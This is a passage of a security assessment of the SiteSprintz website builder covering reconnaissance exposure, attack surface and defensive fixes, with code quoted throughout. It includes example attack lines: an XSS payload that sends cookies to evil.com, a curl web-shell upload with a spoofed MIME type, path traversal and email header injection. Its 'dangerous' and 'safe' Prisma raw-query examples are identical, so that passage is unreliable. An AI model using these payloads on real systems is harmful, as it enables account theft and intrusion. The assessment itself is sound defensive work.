# 🔒 SiteSprintz Security Assessment

**Based on**: Web Application Security principles & OWASP Top 10  
**Date**: November 17, 2025  
**Status**: Comprehensive analysis complete

---

## Executive Summary

SiteSprintz is a **visual website builder SaaS platform** that allows users to:
- Create and manage business websites
- Process payments via Stripe
- Upload and manage files
- Use OAuth authentication (Google)
- Generate and serve static HTML sites

This assessment evaluates SiteSprintz through the lens of **Reconnaissance Prevention**, **Attack Surface Analysis**, and **Defense Implementation**.

---

## 1. 🔍 RECONNAISSANCE - What Information Are We Exposing?

Reconnaissance is the first step in any attack. Let's evaluate what attackers can learn about SiteSprintz **without** actually hacking.

### 1.1 Technology Stack Exposure

**Current Status**: HIGH EXPOSURE ⚠️

**What Attackers Can Learn:**

```bash
# HTTP Headers reveal technology stack
curl -I https://sitesprintz.com

# Likely reveals:
X-Powered-By: Express
Server: nginx/1.x.x or similar
Set-Cookie: connect.sid=...  # Express-session signature
```

**Attack Value:**
- ✅ Identifies Express.js backend → known vulnerabilities
- ✅ Identifies frontend framework (React) → client-side attack vectors
- ✅ Session management approach → session fixation opportunities

**Findings from Codebase:**

```7:10:server.js
import helmet from 'helmet';
// ... but X-Powered-By may still be exposed
```

**Issue**: `helmet()` should hide `X-Powered-By` but verify in production.

---

### 1.2 API Endpoint Discovery

**Current Status**: MODERATE EXPOSURE ⚠️

**Exposed Endpoints** (easily discoverable):

```javascript
// Authentication
POST /api/auth/register
POST /api/auth/login
GET  /api/auth/user

// Sites
POST /api/sites
GET  /api/sites/:id
PUT  /api/sites/:id

// Uploads
POST /api/uploads
POST /api/upload

// Webhooks
POST /api/webhooks/stripe

// Admin
POST /api/admin/* (requires admin role)
```

**Attack Value:**
- ✅ Attackers know exact endpoints to target
- ✅ Can craft automated attacks
- ✅ Can test for authorization flaws

**Recommendation**: This is acceptable - security through obscurity doesn't work. Focus on proper authentication/authorization.

---

### 1.3 Error Message Information Leakage

**Current Status**: NEEDS REVIEW ⚠️

**Potential Issues:**

```javascript
// Example from server.js
catch (err) {
  console.error('Login error:', err);
  res.status(500).json({ error: 'Failed to login' });  // Good - generic
}
```

**Good Practices Found:**
- ✅ Generic error messages to users
- ✅ Detailed errors logged server-side

**Risk Areas to Check:**
- ❌ Database errors (may leak schema info)
- ❌ Validation errors (may reveal business logic)
- ❌ Stack traces in production

---

### 1.4 Subdomain and DNS Enumeration

**Current Status**: MEDIUM RISK ⚠️

**Issue**: Multi-tenant architecture with predictable subdomains

```javascript
// Sites are served at predictable URLs
https://sitesprintz.com/sites/{subdomain}/
```

**Attack Value:**
- ✅ Enumerate all customer sites
- ✅ Identify popular/high-value targets
- ✅ Test for subdomain takeover

**Recommendation**: Acceptable for current architecture, but consider:
- Rate limiting on site creation
- CAPTCHA for public site discovery
- Monitoring for enumeration attempts

---

### 1.5 Dependency Discovery

**Current Status**: MODERATE EXPOSURE ⚠️

**From `package.json`:**

```json
{
  "dependencies": {
    "express": "^5.1.0",
    "stripe": "^19.1.0",
    "pg": "^8.16.3",
    "react": "^19.2.0",
    // ... 20+ more
  }
}
```

**If `package.json` or `package-lock.json` are exposed:**
- ✅ Attackers know EXACT versions
- ✅ Can find known CVEs
- ✅ Can craft version-specific exploits

**Current Protection:**
- ✅ These files are NOT served publicly (in `.gitignore` for web root)

**Issue**: Still visible on GitHub (public repo?)

---

### 1.6 Source Code Exposure

**Current Status**: CRITICAL IF PUBLIC ⚠️

**If GitHub repository is public:**
- ✅ Complete attack blueprint available
- ✅ Business logic revealed
- ✅ Historical vulnerabilities in git history
- ✅ API structure and validation rules exposed

**Recommendation**:
- Keep production repos PRIVATE
- Separate public demo/docs repo from production code
- Never commit secrets (even if later removed)

---

## 2. 🎯 ATTACK SURFACE ANALYSIS

Let's map every entry point where attackers can interact with SiteSprintz.

### 2.1 User Input Entry Points

#### A. Authentication Forms

```javascript
POST /api/auth/register
  - email (validated ✅)
  - password (validated ✅)

POST /api/auth/login
  - email (validated ✅)
  - password (validated ✅)
```

**Current Protection:**

```175:225:server/services/validationService.js
  sanitizeString(str, options = {}) {
    if (str === null || str === undefined) return '';
    if (typeof str !== 'string') str = String(str);

    // Remove zero-width characters if requested
    if (options.removeInvisible) {
      str = str.replace(this.patterns.zeroWidth, '');
    }

    // Decode HTML entities first if requested (to catch encoded XSS)
    if (options.decodeFirst) {
      str = validator.unescape(str);
    }

    // Normalize Unicode
    if (options.normalize) {
      str = str.normalize('NFC');
    }

    // Trim whitespace by default
    str = str.trim();

    // Remove or escape HTML tags
    if (options.escape) {
      str = validator.escape(str);
    } else {
      // Strip HTML tags while preserving text content
      // Using a simple regex approach to keep ALL text content
      str = str.replace(/<script\b[^<]*(?:(?!<\/script>)<[^<]*)*<\/script>/gi, (match) => {
        // Extract text content from script tags
        return match.replace(/<\/?script[^>]*>/gi, '');
      });
      
      // Remove all other HTML tags but keep their content
      str = str.replace(/<[^>]+>/g, '');
      
      // Clean up any remaining dangerous patterns
      str = str.replace(/on\w+\s*=/gi, '');
      str = str.replace(/javascript:/gi, '');
    }

    // Remove shell command injection characters
    str = str.replace(/[;&|`$()]/g, '');

    // Enforce max length
    if (options.maxLength && str.length > options.maxLength) {
      str = str.substring(0, options.maxLength);
    }

    return str;
  }
```

**Strengths:**
- ✅ Comprehensive sanitization
- ✅ XSS prevention
- ✅ Shell injection prevention
- ✅ Length limits

**Concerns:**
- ⚠️ May be overly aggressive (removes legitimate special chars)
- ⚠️ Unicode normalization may have edge cases

---

#### B. Visual Editor (Site Builder)

**CRITICAL ATTACK SURFACE** 🚨

```javascript
POST /api/sites
PUT  /api/sites/:id
  - siteData (JSON object containing HTML/CSS/JS)
```

**Issue**: Users can inject **arbitrary HTML** into generated sites.

**Current Protection**: INSUFFICIENT ⚠️

The `ValidationService` sanitizes strings, but the visual editor generates complete HTML documents:

```javascript
// User can create site with:
{
  "sections": [
    {
      "content": "<img src=x onerror=alert('XSS')>"
    }
  ]
}
```

**Vulnerability Types:**
1. **Stored XSS**: Malicious JS stored in database
2. **Self-XSS**: User attacks themselves (low priority)
3. **Reflected XSS**: Via preview/sharing
4. **DOM-based XSS**: Client-side JS injection

**Risk**: HIGH 🔴
- Affects ALL visitors to generated sites
- Can steal cookies, session tokens
- Can redirect to phishing sites
- Can inject crypto miners

**Recommendation**: See Section 3.1 for detailed mitigation.

---

#### C. File Uploads

**Current Implementation:**

```30:44:server/routes/uploads.routes.js
const upload = multer({ 
  storage: storage,
  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB limit
  fileFilter: (req, file, cb) => {
    const allowedTypes = /jpeg|jpg|png|gif|webp/;
    const extname = allowedTypes.test(path.extname(file.originalname).toLowerCase());
    const mimetype = allowedTypes.test(file.mimetype);
    
    if (mimetype && extname) {
      return cb(null, true);
    } else {
      cb(new Error('Only image files are allowed'));
    }
  }
});
```

**Strengths:**
- ✅ File size limits (10MB)
- ✅ MIME type validation
- ✅ Extension whitelist
- ✅ Unique filename generation

**Vulnerabilities:**

1. **Bypass via Double Extension**:
   ```
   malicious.jpg.php  → detected ✅
   ```

2. **MIME Type Spoofing**:
   ```bash
   # Upload PHP shell with image MIME type
   curl -F "file=@shell.php;type=image/jpeg"
   ```
   **Status**: Partially protected by extension check

3. **Image-based Exploits**:
   - Polyglot files (valid image + malicious payload)
   - EXIF injection
   - Image parser vulnerabilities (libpng, etc.)

4. **Path Traversal**:
   ```javascript
   // Filename: ../../../../etc/passwd
   ```
   **Status**: Protected by `uniqueSuffix` generation ✅

**Recommendations**:
- ✅ Good baseline protection
- ⚠️ Add content-based validation (magic bytes)
- ⚠️ Consider virus scanning for enterprise
- ⚠️ Strip EXIF data to prevent info leakage

---

#### D. Database Queries

**Using Prisma ORM**:

```javascript
// Prisma uses parameterized queries by default
await prisma.user.findUnique({
  where: { id: userId }
});
```

**SQL Injection Risk**: LOW ✅
- Prisma prevents SQL injection via parameterization
- No raw SQL queries found (good!)

**But watch for**:
```javascript
// ❌ DANGEROUS (if it exists):
await prisma.$executeRaw`SELECT * FROM users WHERE id = ${userId}`

// ✅ SAFE:
await prisma.$executeRaw`SELECT * FROM users WHERE id = ${userId}`
// Prisma auto-escapes even in raw queries
```

---

### 2.2 Third-Party Integration Points

#### A. Stripe Payment Processing

**Current Implementation:**

```38:42:server.js
const STRIPE_SECRET_KEY = process.env.STRIPE_SECRET_KEY || '';
const STRIPE_PUBLISHABLE_KEY = process.env.STRIPE_PUBLISHABLE_KEY || '';
const STRIPE_WEBHOOK_SECRET = process.env.STRIPE_WEBHOOK_SECRET || '';
const stripe = STRIPE_SECRET_KEY ? new Stripe(STRIPE_SECRET_KEY, { apiVersion: '2024-06-20' }) : null;
```

**Webhook Handling:**

```javascript
// Signature verification (GOOD!)
POST /api/webhooks/stripe
  - Verifies Stripe signature
  - Validates event authenticity
```

**Vulnerabilities:**

1. **Replay Attacks**: ⚠️
   - Stripe events can be replayed if not tracked
   - **Recommendation**: Store processed event IDs

2. **Race Conditions**: ⚠️
   - Multiple webhooks for same event
   - **Recommendation**: Idempotency keys

3. **Secret Exposure**:
   ```javascript
   const STRIPE_SECRET_KEY = process.env.STRIPE_SECRET_KEY || '';
   ```
   - ✅ Uses environment variables (good)
   - ⚠️ Empty string fallback (should fail fast)

---

#### B. Google OAuth

**Current Status**: CSRF protection via `state` parameter ✅

**Concerns:**
1. **Redirect URI Validation**: Must be exact match
2. **Token Storage**: Where are OAuth tokens stored?
3. **Scope Creep**: Only request minimum required scopes

---

#### C. Email Service (Resend)

**Current Implementation:**

```javascript
const resend = new Resend(process.env.RESEND_API_KEY);

await resend.emails.send({
  from: 'noreply@sitesprintz.com',
  to: userEmail,
  subject: 'Welcome',
  html: emailTemplate
});
```

**Vulnerabilities:**

1. **Email Injection**: ⚠️
   ```javascript
   // If user controls 'to' field:
   to: "victim@test.com\nBcc: attacker@evil.com"
   ```
   **Status**: Check if `userEmail` is validated

2. **HTML Injection in Emails**: ⚠️
   - If email templates include user data
   - Can lead to phishing

3. **Rate Limiting**: ✅
   - 3,000 emails/month on free tier
   - Natural rate limit

---

### 2.3 Session and Authentication

#### A. JWT Token Management

**Current Implementation:**

```836:841:server.js
    const token = jwt.sign({ 
      userId: user.id,
      id: user.id, // For compatibility
      email: user.email, 
      role: user.role
    }, JWT_SECRET, { expiresIn: '7d' });
```

**Strengths:**
- ✅ 7-day expiration
- ✅ Signed with secret

**Vulnerabilities:**

1. **JWT Secret Strength**:
   ```4:4:server/middleware/auth.js
const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-change-in-production';
```
   - ⚠️ Weak default (development)
   - ✅ Should be strong in production

2. **No Token Revocation**: ⚠️
   - JWTs can't be invalidated until expiration
   - **Issue**: Compromised tokens valid for 7 days
   - **Recommendation**: Token blacklist or short-lived tokens + refresh tokens

3. **Token Storage**:
   ```17:18:src/context/AuthContext.jsx
    const storedToken = localStorage.getItem('authToken');
```
   - ⚠️ `localStorage` is vulnerable to XSS
   - **Recommendation**: Use `httpOnly` cookies

4. **No CSRF Protection on Auth Endpoints**: 🚨
   ```107:112:server/middleware/csrf.js
  // Temporarily skip CSRF validation for auth endpoints (until cookie-parser is properly configured)
  console.log('CSRF Check - Path:', req.path, 'Method:', method);
  if (req.path.startsWith('/api/auth/') || req.path.startsWith('/auth/')) {
    console.log('✅ Skipping CSRF for auth endpoint');
    return next();
  }
```
   - 🚨 **CRITICAL**: Auth endpoints bypass CSRF
   - 🚨 **PRODUCTION BLOCKER**

---

#### B. Session Management

**Current Status**: Using `express-session`

**Configuration** (needs verification):
```javascript
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    maxAge: 24 * 60 * 60 * 1000  // 24 hours
  }
}));
```

**Vulnerabilities:**

1. **Session Fixation**: ⚠️
   - Are session IDs regenerated after login?
   - **Check**: `req.session.regenerate()` usage

2. **Session Storage**: ⚠️
   - In-memory storage (lost on restart)
   - **Recommendation**: Redis for production

---

### 2.4 Access Control

#### A. Authorization Checks

**Admin Endpoints:**

```13:73:server/middleware/auth.js
export async function requireAdmin(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1];
  
  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  try {
    // Step 1: Verify JWT token
    const decoded = jwt.verify(token, JWT_SECRET);
    
    // Step 2: Get fresh user data from database
    const result = await dbQuery(
      'SELECT id, email, role, status, subscription_status, subscription_plan FROM users WHERE id = $1',
      [decoded.userId || decoded.id]
    );
    
    if (result.rows.length === 0) {
      return res.status(401).json({ error: 'User not found' });
    }
    
    const user = result.rows[0];
    
    // Step 3: Check if user account is active
    if (user.status !== 'active') {
      return res.status(403).json({ error: 'Account is suspended' });
    }
    
    // Step 4: Check if user is admin
    if (user.role !== 'admin') {
      return res.status(403).json({
        error: 'Admin access required',
        message: 'You do not have permission to access this resource'
      });
    }
    
    // Step 5: Attach user to request
    req.user = {
      id: user.id,
      userId: user.id,
      email: user.email,
      role: user.role,
      status: user.status,
      subscriptionStatus: user.subscription_status,
      subscriptionPlan: user.subscription_plan
    };
    
    next();
    
  } catch (err) {
    if (err.name === 'JsonWebTokenError') {
      return res.status(401).json({ error: 'Invalid token' });
    }
    if (err.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'Token expired' });
    }
    console.error('Admin auth error:', err);

    return res.status(500).json({ error: 'Authentication failed' });
  }
}
```

**Strengths:**
- ✅ Fetches fresh user data from DB (not just JWT)
- ✅ Checks account status
- ✅ Role-based access control

**Potential Issues:**

1. **Insecure Direct Object Reference (IDOR)**: ⚠️
   ```javascript
   // Can user access/modify OTHER users' sites?
   GET /api/sites/:siteId
   ```
   **Check**: Does the endpoint verify ownership?

2. **Horizontal Privilege Escalation**: ⚠️
   ```javascript
   // User A modifies User B's site
   PUT /api/sites/user-b-site-id
   ```
   **Recommendation**: Verify `req.user.id === site.ownerId`

---

## 3. 🛡️ DEFENSE IMPLEMENTATION PLAN

### 3.1 CRITICAL: Fix Visual Editor XSS

**Priority**: P0 🔴  
**Severity**: CRITICAL  
**Impact**: All generated sites vulnerable

#### Problem

Users can inject malicious HTML/JS through the visual editor:

```javascript
{
  "sections": [
    {
      "type": "html",
      "content": "<script>fetch('https://evil.com/steal?cookie='+document.cookie)</script>"
    }
  ]
}
```

#### Solution: Content Security Policy + Sanitization

**Step 1: Server-Side HTML Sanitization**

```javascript
// server/utils/htmlSanitizer.js
import DOMPurify from 'isomorphic-dompurify';

export function sanitizeUserHTML(html, options = {}) {
  const config = {
    ALLOWED_TAGS: [
      'h1', 'h2', 'h3', 'h4', 'h5', 'h6',
      'p', 'br', 'span', 'div', 'section',
      'a', 'img', 'ul', 'ol', 'li',
      'strong', 'em', 'u', 'table', 'tr', 'td', 'th',
      ...options.additionalTags || []
    ],
    ALLOWED_ATTR: [
      'href', 'src', 'alt', 'title', 'class', 'id',
      'width', 'height', 'style'  // Be careful with style
    ],
    ALLOWED_URI_REGEXP: /^(?:(?:https?|mailto|tel):)/i,
    FORBID_TAGS: ['script', 'iframe', 'embed', 'object'],
    FORBID_ATTR: ['onerror', 'onclick', 'onload', 'onmouseover'],
    ALLOW_DATA_ATTR: false
  };

  return DOMPurify.sanitize(html, config);
}
```

**Step 2: Apply to Site Generation**

```javascript
// server/services/siteService.js
import { sanitizeUserHTML } from '../utils/htmlSanitizer.js';

export async function saveSite(userId, siteData) {
  // Sanitize ALL user-generated HTML content
  const sanitizedSections = siteData.sections.map(section => {
    if (section.type === 'html' || section.content) {
      return {
        ...section,
        content: sanitizeUserHTML(section.content)
      };
    }
    return section;
  });

  const sanitizedData = {
    ...siteData,
    sections: sanitizedSections
  };

  // Save to database
  return await prisma.site.create({
    data: {
      userId,
      data: sanitizedData
    }
  });
}
```

**Step 3: Content Security Policy Headers**

```javascript
// server.js - for generated sites
app.use('/sites/:subdomain', (req, res, next) => {
  res.setHeader('Content-Security-Policy', [
    "default-src 'self'",
    "script-src 'self' 'unsafe-inline' https://js.stripe.com",  // Only trusted CDNs
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data: https:",
    "font-src 'self' data:",
    "connect-src 'self' https://api.stripe.com",
    "frame-src https://js.stripe.com",
    "object-src 'none'",
    "base-uri 'self'"
  ].join('; '));
  
  next();
});
```

**Dependencies:**
```json
{
  "dependencies": {
    "isomorphic-dompurify": "^2.0.0"
  }
}
```

---

### 3.2 HIGH: Fix CSRF Protection

**Priority**: P0 🔴  
**Severity**: HIGH  
**Impact**: Authentication endpoints vulnerable

#### Current Issue

```107:112:server/middleware/csrf.js
  // Temporarily skip CSRF validation for auth endpoints (until cookie-parser is properly configured)
  console.log('CSRF Check - Path:', req.path, 'Method:', method);
  if (req.path.startsWith('/api/auth/') || req.path.startsWith('/auth/')) {
    console.log('✅ Skipping CSRF for auth endpoint');
    return next();
  }
```

**🚨 PRODUCTION BLOCKER**: Authentication bypass

#### Solution

**Step 1: Install cookie-parser**

```bash
npm install cookie-parser
```

**Step 2: Configure cookie-parser**

```javascript
// server.js
import cookieParser from 'cookie-parser';

app.use(cookieParser());  // BEFORE bodyParser
app.use(bodyParser.json());
```

**Step 3: Remove CSRF bypass**

```javascript
// server/middleware/csrf.js
export function csrfProtection(req, res, next) {
  const method = req.method.toUpperCase();
  
  // Skip CSRF validation for safe methods
  if (['GET', 'HEAD', 'OPTIONS'].includes(method)) {
    return next();
  }
  
  // Skip CSRF validation for webhook endpoints (signature-verified)
  if (req.path.startsWith('/api/webhooks/')) {
    return next();
  }
  
  // ❌ REMOVE THIS:
  // if (req.path.startsWith('/api/auth/')) {
  //   return next();
  // }
  
  // Validate CSRF token for ALL state-changing requests
  try {
    const sessionId = req.cookies?.sessionId;
    const clientToken = req.headers['x-csrf-token'];
    
    if (!sessionId || !clientToken) {
      return res.status(403).json({ 
        error: 'Invalid CSRF token',
        code: 'CSRF_INVALID'
      });
    }
    
    const storedToken = csrfTokens.get(sessionId);
    if (!storedToken || !crypto.timingSafeEqual(
      Buffer.from(clientToken),
      Buffer.from(storedToken)
    )) {
      return res.status(403).json({ 
        error: 'Invalid CSRF token',
        code: 'CSRF_INVALID'
      });
    }
    
    next();
  } catch (error) {
    console.error('CSRF validation error:', error);
    return res.status(500).json({ error: 'CSRF validation failed' });
  }
}
```

**Step 4: Frontend - Fetch CSRF Token**

```javascript
// src/services/api.js
class APIClient {
  constructor() {
    this.csrfToken = null;
  }

  async ensureCSRFToken() {
    if (!this.csrfToken) {
      const response = await fetch('/api/csrf-token', {
        credentials: 'include'  // Include cookies
      });
      const data = await response.json();
      this.csrfToken = data.csrfToken;
    }
  }

  async request(endpoint, options = {}) {
    // Fetch CSRF token for state-changing requests
    if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(options.method?.toUpperCase())) {
      await this.ensureCSRFToken();
      options.headers = {
        ...options.headers,
        'X-CSRF-Token': this.csrfToken
      };
    }

    options.credentials = 'include';  // Always send cookies
    
    const response = await fetch(endpoint, options);
    return response;
  }
}
```

---

### 3.3 HIGH: Secure JWT Token Storage

**Priority**: P1 🟠  
**Severity**: HIGH  
**Impact**: XSS can steal tokens

#### Current Issue

```17:18:src/context/AuthContext.jsx
    const storedToken = localStorage.getItem('authToken');
```

**Vulnerability**: `localStorage` is accessible via JavaScript  
**Attack**: XSS → `localStorage.getItem('authToken')` → Full account takeover

#### Solution: HttpOnly Cookies

**Step 1: Server - Set JWT in HttpOnly Cookie**

```javascript
// server.js - Login endpoint
app.post('/api/auth/login', async (req, res) => {
  // ... validate credentials ...
  
  const token = jwt.sign({ 
    userId: user.id,
    email: user.email, 
    role: user.role
  }, JWT_SECRET, { expiresIn: '7d' });
  
  // Set JWT in httpOnly cookie (NOT accessible via JavaScript)
  res.cookie('authToken', token, {
    httpOnly: true,  // Prevents JavaScript access
    secure: process.env.NODE_ENV === 'production',  // HTTPS only
    sameSite: 'strict',  // CSRF protection
    maxAge: 7 * 24 * 60 * 60 * 1000  // 7 days
  });
  
  // Return user data (but NOT the token)
  res.json({ 
    success: true, 
    user: { 
      id: user.id, 
      email: user.email, 
      role: user.role
    } 
  });
});
```

**Step 2: Server - Read JWT from Cookie**

```javascript
// server/middleware/auth.js
export async function requireAuth(req, res, next) {
  // Try Authorization header first (for API clients)
  let token = req.headers['authorization']?.split(' ')[1];
  
  // Fallback to cookie (for browser clients)
  if (!token) {
    token = req.cookies?.authToken;
  }
  
  if (!token) {
    return res.status(401).json({ error: 'No token provided' });
  }
  
  try {
    const decoded = jwt.verify(token, JWT_SECRET);
    // ... rest of auth logic ...
  } catch (err) {
    return res.status(401).json({ error: 'Invalid token' });
  }
}
```

**Step 3: Frontend - Remove localStorage**

```javascript
// src/context/AuthContext.jsx
export function AuthProvider({ children }) {
  const [user, setUser] = useState(null);
  const [loading, setLoading] = useState(true);

  // Check auth status on mount
  useEffect(() => {
    checkAuth();
  }, []);

  const checkAuth = async () => {
    try {
      // No need to send token - it's in httpOnly cookie
      const response = await fetch('/api/auth/user', {
        credentials: 'include'  // Include cookies
      });
      
      if (response.ok) {
        const userData = await response.json();
        setUser(userData.user);
      }
    } catch (error) {
      console.error('Auth check failed:', error);
    } finally {
      setLoading(false);
    }
  };

  const login = async (email, password) => {
    const response = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',  // Include cookies
      body: JSON.stringify({ email, password })
    });
    
    const data = await response.json();
    if (data.success) {
      setUser(data.user);
      // No localStorage.setItem('authToken', data.token)
    }
    return data;
  };

  const logout = async () => {
    await fetch('/api/auth/logout', {
      method: 'POST',
      credentials: 'include'
    });
    setUser(null);
    // No localStorage.removeItem('authToken')
  };

  // ... rest of context ...
}
```

**Step 4: Logout - Clear Cookie**

```javascript
// server.js
app.post('/api/auth/logout', (req, res) => {
  res.clearCookie('authToken', {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict'
  });
  res.json({ success: true });
});
```

---

### 3.4 MEDIUM: Add Security Headersp

**Priority**: P1 🟠  
**Severity**: MEDIUM  
**Impact**: Defense in depth

#### Helmet Configuration

```javascript
// server.js
import helmet from 'helmet';

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        // Only allow specific CDNs
        "https://js.stripe.com",
        "https://www.google.com/recaptcha/",
        "'unsafe-inline'"  // Required for inline scripts (minimize usage)
      ],
      styleSrc: [
        "'self'", 
        "'unsafe-inline'",  // For inline styles
        "https://fonts.googleapis.com"
      ],
      imgSrc: [
        "'self'",
        "data:",
        "https:",  // Allow images from any HTTPS source
        "blob:"
      ],
      fontSrc: [
        "'self'",
        "https://fonts.gstatic.com"
      ],
      connectSrc: [
        "'self'",
        "https://api.stripe.com",
        "https://api.resend.com"
      ],
      frameSrc: [
        "https://js.stripe.com",  // Stripe checkout
        "https://www.google.com/recaptcha/"
      ],
      objectSrc: ["'none'"],
      upgradeInsecureRequests: []
    }
  },
  
  // Remove X-Powered-By header
  hidePoweredBy: true,
  
  // Prevent clickjacking
  frameguard: {
    action: 'deny'  // or 'sameorigin'
  },
  
  // Force HTTPS
  hsts: {
    maxAge: 31536000,  // 1 year
    includeSubDomains: true,
    preload: true
  },
  
  // Prevent MIME sniffing
  noSniff: true,
  
  // XSS Protection (legacy, but doesn't hurt)
  xssFilter: true,
  
  // Referrer Policy
  referrerPolicy: {
    policy: 'strict-origin-when-cross-origin'
  }
}));
```

---

### 3.5 MEDIUM: Add Rate Limiting

**Priority**: P2 🟡  
**Severity**: MEDIUM  
**Impact**: Prevents brute force, DoS

#### Enhanced Rate Limiting

```javascript
// server/middleware/rateLimiting.js
import rateLimit from 'express-rate-limit';
import RedisStore from 'rate-limit-redis';
import redis from 'redis';

// Redis client (for distributed rate limiting)
const redisClient = redis.createClient({
  url: process.env.REDIS_URL || 'redis://localhost:6379'
});

// General API rate limit
export const apiLimiter = rateLimit({
  store: new RedisStore({
    client: redisClient,
    prefix: 'rl:api:'
  }),
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 100,  // 100 requests per 15 minutes
  message: 'Too many requests, please try again later.',
  standardHeaders: true,
  legacyHeaders: false
});

// Strict rate limit for authentication
export const authLimiter = rateLimit({
  store: new RedisStore({
    client: redisClient,
    prefix: 'rl:auth:'
  }),
  windowMs: 15 * 60 * 1000,  // 15 minutes
  max: 5,  // 5 attempts per 15 minutes
  skipSuccessfulRequests: true,  // Don't count successful logins
  message: 'Too many login attempts, please try again later.',
  standardHeaders: true,
  legacyHeaders: false
});

// File upload rate limit
export const uploadLimiter = rateLimit({
  store: new RedisStore({
    client: redisClient,
    prefix: 'rl:upload:'
  }),
  windowMs: 60 * 60 * 1000,  // 1 hour
  max: 50,  // 50 uploads per hour
  message: 'Upload limit exceeded, please try again later.'
});

// Webhook rate limit (per subdomain)
export const webhookLimiter = rateLimit({
  windowMs: 5 * 60 * 1000,  // 5 minutes
  max: 100,  // 100 webhooks per 5 minutes (Stripe sends bursts)
  keyGenerator: (req) => {
    // Rate limit by Stripe account ID (from signature)
    return req.stripeAccount || req.ip;
  }
});
```

**Apply to Routes:**

```javascript
// server.js
import { apiLimiter, authLimiter, uploadLimiter } from './server/middleware/rateLimiting.js';

// Apply to all API routes
app.use('/api/', apiLimiter);

// Stricter limit for auth
app.use('/api/auth/login', authLimiter);
app.use('/api/auth/register', authLimiter);

// Upload limit
app.use('/api/upload', uploadLimiter);
```

**Dependencies:**
```bash
npm install rate-limit-redis redis
```

---

### 3.6 MEDIUM: Improve File Upload Security

**Priority**: P2 🟡  
**Severity**: MEDIUM  
**Impact**: Prevent malicious file uploads

#### Enhanced File Validation

```javascript
// server/utils/fileValidator.js
import fs from 'fs/promises';
import { fileTypeFromBuffer } from 'file-type';
import sharp from 'sharp';  // Already installed

/**
 * Validate uploaded file is actually an image
 * Checks magic bytes, not just extension/MIME type
 */
export async function validateImageFile(filePath) {
  try {
    // Read first 4100 bytes (enough for file-type detection)
    const buffer = await fs.readFile(filePath);
    
    // Check magic bytes
    const fileType = await fileTypeFromBuffer(buffer);
    
    if (!fileType) {
      throw new Error('Unable to determine file type');
    }
    
    // Whitelist of allowed image types
    const allowedTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
    
    if (!allowedTypes.includes(fileType.mime)) {
      throw new Error(`Invalid file type: ${fileType.mime}`);
    }
    
    // Additional validation: try to parse as image
    try {
      const metadata = await sharp(filePath).metadata();
      
      // Check reasonable dimensions (prevent decompression bombs)
      if (metadata.width > 10000 || metadata.height > 10000) {
        throw new Error('Image dimensions too large');
      }
      
      // Check pixel count (prevent massive images)
      if (metadata.width * metadata.height > 100000000) {  // 100MP
        throw new Error('Image too large');
      }
      
    } catch (err) {
      throw new Error('Invalid image file: ' + err.message);
    }
    
    return true;
    
  } catch (error) {
    throw new Error('File validation failed: ' + error.message);
  }
}

/**
 * Strip EXIF data from images (privacy + security)
 */
export async function sanitizeImage(inputPath, outputPath) {
  try {
    await sharp(inputPath)
      .rotate()  // Auto-rotate based on EXIF
      .withMetadata({ exif: {}, icc: {} })  // Strip EXIF but keep color profile
      .toFile(outputPath);
    
    return true;
  } catch (error) {
    throw new Error('Image sanitization failed: ' + error.message);
  }
}
```

**Apply to Upload Route:**

```javascript
// server/routes/uploads.routes.js
import { validateImageFile, sanitizeImage } from '../utils/fileValidator.js';
import path from 'path';
import fs from 'fs/promises';

router.post('/', requireAuth, (req, res) => {
  upload.single('image')(req, res, async (err) => {
    if (err) {
      return res.status(400).json({ error: err.message });
    }
    
    if (!req.file) {
      return res.status(400).json({ error: 'No file uploaded' });
    }
    
    try {
      // Validate file is actually an image (magic bytes)
      await validateImageFile(req.file.path);
      
      // Sanitize image (strip EXIF)
      const sanitizedPath = req.file.path + '.sanitized';
      await sanitizeImage(req.file.path, sanitizedPath);
      
      // Replace original with sanitized
      await fs.unlink(req.file.path);
      await fs.rename(sanitizedPath, req.file.path);
      
      res.json({ 
        success: true, 
        url: `/uploads/${req.file.filename}`
      });
      
    } catch (error) {
      // Delete invalid file
      await fs.unlink(req.file.path).catch(() => {});
      
      console.error('File validation error:', error);
      return res.status(400).json({ 
        error: 'Invalid file',
        message: error.message
      });
    }
  });
});
```

**Dependencies:**
```bash
npm install file-type
# sharp already installed ✅
```

---

### 3.7 LOW: Add Security Monitoring

**Priority**: P3 🟢  
**Severity**: LOW  
**Impact**: Detect attacks in progress

#### Security Event Logging

```javascript
// server/utils/securityLogger.js
import winston from 'winston';  // Already installed

const securityLogger = winston.createLogger({
  level: 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.json()
  ),
  transports: [
    new winston.transports.File({ 
      filename: 'logs/security.log',
      maxsize: 10485760,  // 10MB
      maxFiles: 5
    }),
    new winston.transports.Console({
      format: winston.format.simple()
    })
  ]
});

export function logSecurityEvent(event) {
  securityLogger.warn({
    type: 'security_event',
    event: event.type,
    severity: event.severity,
    userId: event.userId,
    ip: event.ip,
    userAgent: event.userAgent,
    details: event.details,
    timestamp: new Date().toISOString()
  });
}

// Predefined event types
export const SecurityEvents = {
  // Authentication
  LOGIN_FAILED: 'login_failed',
  LOGIN_SUCCESS: 'login_success',
  LOGOUT: 'logout',
  TOKEN_EXPIRED: 'token_expired',
  TOKEN_INVALID: 'token_invalid',
  
  // Authorization
  UNAUTHORIZED_ACCESS: 'unauthorized_access',
  PERMISSION_DENIED: 'permission_denied',
  
  // Input Validation
  VALIDATION_FAILED: 'validation_failed',
  XSS_ATTEMPT: 'xss_attempt',
  SQL_INJECTION_ATTEMPT: 'sql_injection_attempt',
  
  // Rate Limiting
